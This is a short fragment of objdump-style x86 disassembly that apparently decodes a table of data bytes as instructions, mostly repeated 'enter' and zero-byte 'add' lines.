  42c8bf:	xchg   edx,eax
  42c8c0:	inc    edx
  42c8c1:	add    BYTE PTR [edx-0x79ffbd38],al
  42c8c7:	enter  0x42,0x8a
  42c8cb:	enter  0x42,0x8e
  42c8cf:	enter  0x42,0x92
  42c8d3:	enter  0x42,0x96
  42c8d7:	enter  0x42,0x9a
  42c8db:	enter  0x42,0x9e
  42c8df:	enter  0x42,0x0
  42c8e3:	add    BYTE PTR [eax],al
  42c8e5:	add    BYTE PTR [eax],al
  42c8e7:	add    BYTE PTR [eax],al
  42c8e9:	add    BYTE PTR [eax+eax*1],al
	...
